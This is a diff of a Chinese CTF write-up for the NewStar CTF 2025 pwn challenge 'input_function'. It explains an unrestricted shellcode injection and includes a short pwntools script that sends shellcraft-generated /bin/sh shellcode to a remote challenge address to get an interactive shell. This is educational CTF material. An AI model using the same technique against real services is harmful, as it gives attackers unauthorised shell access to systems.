@@ -2,7 +2,16 @@
 titleTemplate: ":title | WriteUp - NewStar CTF 2025"
 ---
 
+<script setup>
+import Container from '@/components/docs/Container.vue'
+</script>
+
 # input_function
+
+<Container type='info'>
+
+本题考查无限制 shellcode 的注入。
+</Container>
 
 用 IDA 打开这个程序，点击 <kbd>F5</kbd>，我们就可以看到程序的反编译，如下图：
 
@@ -24,15 +33,14 @@ titleTemplate: ":title | WriteUp - NewStar CTF 2025"
 
 这一题是初级 shellcode，我们输入的内容会被解析成函数并执行，因此我们要写汇编代码，并通过 `asm()` 函数等方式汇编成机器码，并将机器码输入交互程序中。
 
-由于可输入的字符数很多，因此可以使用 `pwntools` 直接生成。
+由于可输入的字符数很多，因此可以使用 Python 脚本和 `pwntools` 库直接生成。
 
 ```python
 from pwn import *
 context(os="linux", arch="amd64", log_level="debug")
 
 io = remote("8.147.132.32", 12380)
-# io = remote("127.0.0.1", 11337)
-# io = process("src/pwn")
+# io = process("./pwn")
 
 shell = shellcraft.sh()
 shell = asm(shell)
@@ -41,6 +49,4 @@ io.send(shell)
 io.interactive()
 ```
 
-从 week2 开始在一定条件下需要手写 shellcode，具体可看这篇文章：
-
-[用汇编语言构造简单的shellcode（64位&&32位）以及将汇编语言转换成机器码的方法](https://www.cnblogs.com/ZIKH26/articles/15845766.html)
+关于手写 shellcode，具体可以阅读[这篇文章](https://www.cnblogs.com/ZIKH26/articles/15845766.html)。
